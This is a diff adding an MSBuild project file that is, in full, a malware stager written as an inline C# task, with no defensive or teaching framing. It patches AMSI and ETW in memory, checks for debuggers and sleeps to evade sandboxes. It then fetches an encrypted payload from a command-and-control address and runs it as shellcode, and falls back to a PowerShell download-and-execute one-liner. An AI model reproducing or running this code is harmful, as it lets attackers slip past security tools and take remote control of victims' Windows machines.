@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- msbuild_stager.xml - MSBuild inline task for stealthy execution -->
+<!-- Usage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_stager.xml -->
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Kestrel7">
+    <UsingTask TaskName="Kestrel7Task" TaskFactory="CodeTaskFactory" 
+               AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+      <ParameterGroup/>
+      <Task>
+        <Using Namespace="System"/>
+        <Using Namespace="System.Net"/>
+        <Using Namespace="System.Net.Security"/>
+        <Using Namespace="System.Security.Cryptography"/>
+        <Using Namespace="System.Diagnostics"/>
+        <Using Namespace="System.Runtime.InteropServices"/>
+        <Using Namespace="System.IO"/>
+        <Using Namespace="System.Threading"/>
+        
+        <Code Type="Fragment" Language="cs">
+          <![CDATA[
+            public class Kestrel7Task : Microsoft.Build.Utilities.Task {
+                // P/Invoke for Win32 API
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+                                                         uint flAllocationType, uint flProtect);
+                
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+                                                          IntPtr lpStartAddress, IntPtr lpParameter,
+                                                          uint dwCreationFlags, IntPtr lpThreadId);
+                
+                [DllImport("kernel32.dll")]
+                public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+                
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr GetModuleHandle(string lpModuleName);
+                
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+                
+                [DllImport("kernel32.dll")]
+                public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, 
+                                                         uint flNewProtect, out uint lpflOldProtect);
+                
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr GetCurrentProcess();
+                
+                [DllImport("kernel32.dll")]
+                public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+                                                             byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+                
+                [DllImport("kernel32.dll")]
+                public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+                
+                [DllImport("kernel32.dll")]
+                public static extern bool CloseHandle(IntPtr hObject);
+                
+                [DllImport("user32.dll")]
+                public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
+                
+                // AES-256 decryption
+                private byte[] DecryptPayload(byte[] data, byte[] key) {
+                    try {
+                        using (var aes = new AesManaged()) {
+                            aes.Key = key;
+                            aes.IV = new byte[16];
+                            aes.Mode = CipherMode.CBC;
+                            aes.Padding = PaddingMode.PKCS7;
+                            using (var decryptor = aes.CreateDecryptor()) {
+                                return decryptor.TransformFinalBlock(data, 0, data.Length);
+                            }
+                        }
+                    } catch {
+                        // RC4 fallback (XOR)
+                        byte[] result = new byte[data.Length];
+                        for (int i = 0; i < data.Length; i++) {
+                            result[i] = (byte)(data[i] ^ key[i % key.Length]);
+                        }
+                        return result;
+                    }
+                }
+                
+                // Base64 decode
+                private byte[] Base64Decode(string data) {
+                    return Convert.FromBase64String(data);
+                }
+                
+                // Execute shellcode
+                private void ExecuteShellcode(byte[] shellcode) {
+                    IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+                    if (mem == IntPtr.Zero) return;
+                    
+                    Marshal.Copy(shellcode, 0, mem, shellcode.Length);
+                    
+                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+                    if (hThread != IntPtr.Zero) {
+                        WaitForSingleObject(hThread, 0xFFFFFFFF);
+                        CloseHandle(hThread);
+                    }
+                    
+                    VirtualFree(mem, 0, 0x8000);
+                }
+                
+                // AMSI bypass via memory patching
+                private void BypassAMSI() {
+                    try {
+                        IntPtr amsiDll = GetModuleHandle("amsi.dll");
+                        if (amsiDll != IntPtr.Zero) {
+                            IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
+                            if (amsiScanBuffer != IntPtr.Zero) {
+                                uint oldProtect;
+                                VirtualProtect(amsiScanBuffer, 6, 0x40, out oldProtect);
+                                // mov eax, 0; ret (always return AMSI_RESULT_CLEAN)
+                                Marshal.WriteByte(amsiScanBuffer, 0, 0xB8);
+                                Marshal.WriteByte(amsiScanBuffer, 1, 0x00);
+                                Marshal.WriteByte(amsiScanBuffer, 2, 0x00);
+                                Marshal.WriteByte(amsiScanBuffer, 3, 0x00);
+                                Marshal.WriteByte(amsiScanBuffer, 4, 0x00);
+                                Marshal.WriteByte(amsiScanBuffer, 5, 0xC3);
+                                VirtualProtect(amsiScanBuffer, 6, oldProtect, out oldProtect);
+                            }
+                        }
+                    } catch { }
+                }
+                
+                // ETW patch
+                private void PatchETW() {
+                    try {
+                        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+                        if (ntdll != IntPtr.Zero) {
+                            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+                            if (etwEventWrite != IntPtr.Zero) {
+                                uint oldProtect;
+                                VirtualProtect(etwEventWrite, 6, 0x40, out oldProtect);
+                                // mov eax, 0xC0000000; ret (STATUS_SUCCESS)
+                                Marshal.WriteByte(etwEventWrite, 0, 0xB8);
+                                Marshal.WriteByte(etwEventWrite, 1, 0x00);
+                                Marshal.WriteByte(etwEventWrite, 2, 0x00);
+                                Marshal.WriteByte(etwEventWrite, 3, 0x00);
+                                Marshal.WriteByte(etwEventWrite, 4, 0x00);
+                                Marshal.WriteByte(etwEventWrite, 5, 0xC3);
+                                VirtualProtect(etwEventWrite, 6, oldProtect, out oldProtect);
+                            }
+                        }
+                    } catch { }
+                }
+                
+                // Anti-debug checks
+                private bool IsDebugged() {
+                    try {
+                        // Check for debugger processes
+                        Process[] procs = Process.GetProcesses();
+                        string[] debuggers = { "ollydbg", "x64dbg", "windbg", "ida", "immunity", "procdump", "dnSpy" };
+                        foreach (Process p in procs) {
+                            foreach (string d in debuggers) {
+                                if (p.ProcessName.ToLower().Contains(d)) {
+                                    return true;
+                                }
+                            }
+                        }
+                    } catch { }
+                    return false;
+                }
+                
+                // Download payload from C2
+                private byte[] DownloadPayload(string url) {
+                    try {
+                        ServicePointManager.ServerCertificateValidationCallback = 
+                            (sender, cert, chain, sslPolicyErrors) => { return true; };
+                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                        
+                        using (WebClient wc = new WebClient()) {
+                            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                            wc.Headers.Add("X-Client-ID", "MSBuild-Stager");
+                            return wc.DownloadData(url);
+                        }
+                    } catch {
+                        return null;
+                    }
+                }
+                
+                public override bool Execute() {
+                    // Anti-debug
+                    if (IsDebugged()) {
+                        return true; // Exit silently
+                    }
+                    
+                    // Bypass security
+                    BypassAMSI();
+                    PatchETW();
+                    
+                    // Sleep to avoid sandbox detection
+                    Random rnd = new Random();
+                    Thread.Sleep(rnd.Next(5000, 15000));
+                    
+                    // Primary C2 URL (encrypted payload)
+                    string c2Url = "https://192.168.1.100:443/beacon";
+                    byte[] encryptedData = DownloadPayload(c2Url);
+                    
+                    if (encryptedData == null || encryptedData.Length < 32) {
+                        // Fallback: use embedded base64 payload
+                        string embedded = "BASE64_ENCODED_PAYLOAD_HERE";
+                        encryptedData = Base64Decode(embedded);
+                    }
+                    
+                    if (encryptedData != null && encryptedData.Length > 0) {
+                        // Decrypt with key
+                        string keyString = "Kestrel7_Win11_RevShell_2026";
+                        byte[] key = System.Text.Encoding.UTF8.GetBytes(keyString);
+                        Array.Resize(ref key, 32);
+                        
+                        byte[] shellcode = DecryptPayload(encryptedData, key);
+                        
+                        // Verify shellcode (check for MZ header or valid entry)
+                        if (shellcode != null && shellcode.Length > 100) {
+                            ExecuteShellcode(shellcode);
+                        }
+                    }
+                    
+                    // Legacy fallback: direct PowerShell
+                    try {
+                        string psCmd = "powershell -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stager.ps1')\"";
+                        Process.Start("cmd.exe", "/c " + psCmd);
+                    } catch { }
+                    
+                    return true;
+                }
+            }
+          ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+    
+    <!-- Execute the task -->
+    <Kestrel7Task />
+  </Target>
+</Project>
